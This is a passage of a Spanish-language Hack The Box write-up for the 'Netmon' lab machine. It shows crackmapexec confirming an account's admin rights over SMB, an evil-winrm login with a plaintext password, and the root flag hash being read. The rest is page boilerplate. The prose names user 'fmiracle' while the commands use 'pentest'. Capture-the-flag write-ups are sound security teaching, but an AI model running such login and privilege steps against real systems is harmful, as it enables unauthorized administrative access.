+<p><img src="/assets/images/HTB/htb-writeup-Netmon/netmon12.PNG" alt="" /></p>
+
+<p>Le damos ok en la confirmación y ya deberia haberse ejecutado la acción.</p>
+
+<p>Como vimos que el puerto <code>445</code> esta abierto podemos usar <code>crackmapexec</code> y validamos que el usuario <code>fmiracle</code> ahora existe y forma parte de los usuarios <code>administradores</code>.</p>
+
+<pre><code class="language-bash">❯ crackmapexec smb 10.10.10.152 -u 'pentest' -p 'p3nT3st!'
+SMB         10.10.10.152    445    NETMON           [*] Windows Server 2016 Standard 14393 x64 (name:NETMON) (domain:netmon) (signing:False) (SMBv1:True)
+SMB         10.10.10.152    445    NETMON           [+] netmon\pentest:p3nT3st! (Pwn3d!)
+</code></pre>
+
+<p>Ahora haciendo uso del servicio de administración remota de windows, podemos conectarnos por el puerto <code>5985</code>, usando la herramienta <code>evil-winrm</code>.</p>
+
+<pre><code class="language-bash">❯ evil-winrm -i 10.10.10.152 -u 'pentest' -p 'p3nT3st!'
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\pentest\Documents&gt; cd C:\Users
+</code></pre>
+
+<p>Una vez ya en el sistema podemos dirigirnos al directorio personal del usuario <code>Administrator</code> y visualizar la segunda flag <code>root.txt</code>.</p>
+
+<pre><code class="language-cmd">*Evil-WinRM* PS C:\Users&gt; cd Administrator
+*Evil-WinRM* PS C:\Users\Administrator&gt; cd Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt
+491b992fe825994a2fad4199afd2ca76
+</code></pre>
+
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        ⚉
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=Maquina Netmon - htb writeup&url=http://localhost:4000/hackthebox/htb-writeup-Netmon" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/1014319" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/Firtsmiracle" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+
+    </div>
+
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Jekyll Theme by</a> WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+<!-- Bootstrap and images ZOOM feature
+================================================== -->
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+</body>
+</html>
